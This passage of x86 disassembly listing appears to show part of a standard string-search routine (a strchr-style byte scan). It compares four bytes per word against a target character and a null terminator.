  428bac:	xor    eax,0xffffffff
  428baf:	xor    ecx,edi
  428bb1:	xor    eax,esi
  428bb3:	add    edx,0x4
  428bb6:	and    ecx,0x81010100
  428bbc:	jne    0x428bda
  428bbe:	and    eax,0x81010100
  428bc3:	je     0x428b98
  428bc5:	and    eax,0x1010100
  428bca:	jne    0x428bd4
  428bcc:	and    esi,0x80000000
  428bd2:	jne    0x428b98
  428bd4:	pop    esi
  428bd5:	pop    edi
  428bd6:	pop    ebx
  428bd7:	xor    eax,eax
  428bd9:	ret    
  428bda:	mov    eax,DWORD PTR [edx-0x4]
  428bdd:	cmp    al,bl
  428bdf:	je     0x428c17
  428be1:	test   al,al
  428be3:	je     0x428bd4
  428be5:	cmp    ah,bl
  428be7:	je     0x428c10
  428be9:	test   ah,ah
  428beb:	je     0x428bd4
  428bed:	shr    eax,0x10
  428bf0:	cmp    al,bl
  428bf2:	je     0x428c09
  428bf4:	test   al,al
  428bf6:	je     0x428bd4
  428bf8:	cmp    ah,bl
  428bfa:	je     0x428c02
  428bfc:	test   ah,ah
  428bfe:	je     0x428bd4
  428c00:	jmp    0x428b98
  428c02:	pop    esi
  428c03:	pop    edi
  428c04:	lea    eax,[edx-0x1]
  428c07:	pop    ebx
  428c08:	ret    
  428c09:	lea    eax,[edx-0x2]
  428c0c:	pop    esi
  428c0d:	pop    edi
  428c0e:	pop    ebx
  428c0f:	ret    
  428c10:	lea    eax,[edx-0x3]
  428c13:	pop    esi
  428c14:	pop    edi
  428c15:	pop    ebx
  428c16:	ret    
  428c17:	lea    eax,[edx-0x4]
  428c1a:	pop    esi
  428c1b:	pop    edi
  428c1c:	pop    ebx
  428c1d:	ret    
  428c1e:	jmp    DWORD PTR ds:0x429100
